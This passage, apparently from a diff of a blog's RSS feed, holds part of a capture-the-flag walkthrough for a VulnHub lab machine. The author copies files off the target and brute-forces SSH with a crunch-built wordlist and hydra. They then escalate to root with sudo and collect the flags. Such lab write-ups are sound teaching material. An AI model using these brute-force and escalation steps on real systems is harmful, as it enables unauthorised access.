-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  18 May 30 14:53 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 193 May 30 14:53 .bash_profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 231 May 30 14:53 .bashrc
-drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21 09:50 RICKS_SAFE
-drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 ThisDoesntContainAnyFlags&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That’s what we want to investigate now, contents of both Rick and Morty home directories. Let’s start with &lt;strong&gt;Morty&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/Morty/Safe_Password.jpg ~
-Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
-Safe_Password.jpg                             100%   42KB  10.8MB/s   00:00
-root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/Morty/journal.txt.zip ~
-Summer@10.0.2.15'&lt;/span&gt;s password:
-journal.txt.zip                               100%  414   241.4KB/s   00:00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After copying files using &lt;strong&gt;scp&lt;/strong&gt;, we can safely investigate them on our machine. Unfortuntely zip file is password protected.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# unzip journal.txt.zip
-Archive:  journal.txt.zip
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;journal.txt.zip] journal.txt password:
-password incorrect--reenter:
-password incorrect--reenter:
-   skipping: journal.txt             incorrect password
-   root@kali:~# strings Safe_Password.jpg
-   JFIF
-   Exif
-   8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
-   8BIM
-   8BIM
-   &lt;span class=&quot;nv&quot;&gt;$3br&lt;/span&gt;
-   %&amp;amp;&lt;span class=&quot;s1&quot;&gt;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-   	#3R
-   &amp;amp;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-   0D000D&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;DDD&lt;span class=&quot;se&quot;&gt;\t\\\\\t&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Which was revealed by using &lt;strong&gt;string&lt;/strong&gt; command. Now we can unzip it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# unzip journal.txt.zip
-Archive:  journal.txt.zip
-[journal.txt.zip] journal.txt password:
-  inflating: journal.txt             
-root@kali:~# cat journal.txt
-Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
-
-Anyway. Here it is:
-
-FLAG: {131333} - 20 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another flag that brings us to &lt;strong&gt;70pts&lt;/strong&gt;. And a password to the safe!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/RickSanchez/RICKS_SAFE/safe ~
-Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
-safe                                          100% 8704     2.8MB/s   00:00
-root@kali:~# binwalk safe
-
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This file was indentified by &lt;strong&gt;binwalk&lt;/strong&gt; as an executable. Let’s run it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
-./safe: error &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But firstly, we have to install mcrypt library.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
-Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we’re ready to go and run the program with proper argument.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe 131333
-decrypt: 	FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;And Awwwaaaaayyyy we Go!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 20 Points
-
-Ricks password hints:
- &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;This is incase I forget.. I just hope I don&lt;span class=&quot;s1&quot;&gt;'t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
-Follow these clues, in order
-
-
-1 uppercase character
-1 digit
-One of the words in my old bands name.�	@&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another flag, summing up to &lt;strong&gt;90pts&lt;/strong&gt;, together with a clue to the Rick’s password.&lt;/p&gt;
-
-&lt;p&gt;Firsly we know that Rick played in band called “The Flesh Curtains”, so we can extract each of the word into a different password combination. To make wordlists simpler and smaller, I decided to firstly create a list maching this pattern - A-Z:0-9:&amp;lt;one of the 3 words&amp;gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# crunch 5 5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%The &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rick.txt
-Crunch will now generate the following amount of data: 1560 bytes
-0 MB
-0 GB
-0 TB
-0 PB
-Crunch will now generate the following number of lines: 260
-root@kali:~# crunch 7 7 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Flesh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
-Crunch will now generate the following amount of data: 2080 bytes
-0 MB
-0 GB
-0 TB
-0 PB
-Crunch will now generate the following number of lines: 260
-root@kali:~# crunch 10 10 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Curtains &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
-Crunch will now generate the following amount of data: 2860 bytes
-0 MB
-0 GB
-0 TB
-0 PB
-Crunch will now generate the following number of lines: 260&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can run &lt;strong&gt;hydra&lt;/strong&gt; and crack the password.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; RickSanchez &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rick.txt ssh://10.0.2.15 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 22222
-Hydra v8.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2017 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.
-
-Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-11-01 07:54:44
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Restorefile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;you have 10 seconds to abort... &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use option &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; to skip waiting&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; from a previous session found, to prevent overwriting, ./hydra.restore
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:780&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~49 tries per task
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.0.2.15:22222/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22222][ssh] host: 10.0.2.15   login: RickSanchez   password: P7Curtains
-1 of 1 target successfully completed, 1 valid password found
-Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2017-11-01 07:55:24&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Got it! &lt;strong&gt;P7Curtains&lt;/strong&gt; is the password, so we can now log in once again.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 RickSanchez@10.0.2.15
-RickSanchez@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
-Permission denied, please try again.
-RickSanchez@10.0.2.15'&lt;/span&gt;s password:
-Last failed login: Wed Nov  1 22:57:05 AEDT 2017 from 10.0.2.4 on ssh:notty
-There were 272 failed login attempts since the last successful login.
-Last login: Thu Sep 21 09:45:24 2017
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another directory was just a troll.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ThisDoesntContainAnyFlags/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 4
-drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  95 Aug 18 20:26 NotAFlag.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;more NotAFlag.txt
-hhHHAaaaAAGgGAh. You totally fell &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;it... Classiiiigihhic.
-But seriously this isn&lt;span class=&quot;s1&quot;&gt;'t a flag..&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Wait, we can use &lt;strong&gt;sudo&lt;/strong&gt; with Rick’s password to log in as &lt;strong&gt;root&lt;/strong&gt;. That’s awesome.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RickSanchez:
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost RickSanchez]# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 36
-dr-xr-x---.  4 root root  191 Aug 25 14:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-dr-xr-xr-x. 17 root root  236 Aug 18 19:16 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Nov  1 23:02 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Feb 12  2017 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bash_profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bashrc
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  100 Feb 12  2017 .cshrc
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   32 Aug 22 10:16 .lesshst
-drwxr-----.  3 root root   19 Aug 21 17:35 .pki
-drwx------.  2 root root   25 Aug 22 08:21 .ssh
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  129 Feb 12  2017 .tcshrc
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   40 Aug 22 07:37 FLAG.txt
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root 1214 Aug 18 18:16 anaconda-ks.cfg
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# more FLAG.txt
-FLAG: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Ionic Defibrillator&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 30 points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here’s another flag, giving us a total of &lt;strong&gt;120pts&lt;/strong&gt;. Where are the last 20? Probably port 60000, as we never checked what’s inside.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# telnet 10.0.2.15 60000
-Trying 10.0.2.15...
-Connected to 10.0.2.15.
-Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Welcome to Ricks half baked reverse shell...
-&lt;span class=&quot;c&quot;&gt;# ls -la&lt;/span&gt;
-FLAG.txt
-&lt;span class=&quot;c&quot;&gt;# more FLAG.txt&lt;/span&gt;
-: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;c&quot;&gt;# cat FLAG.txt&lt;/span&gt;
-FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Flip the pickle Morty!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And there was the last flag - &lt;strong&gt;130/130pts&lt;/strong&gt;.&lt;/p&gt;
-</description>
-        <pubDate>Wed, 01 Nov 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/vulnhub-rickdiculouslyeasy/</link>
-        <guid isPermaLink="true">http://localhost:4000/vulnhub-rickdiculouslyeasy/</guid>
       </item>
     
   </channel>
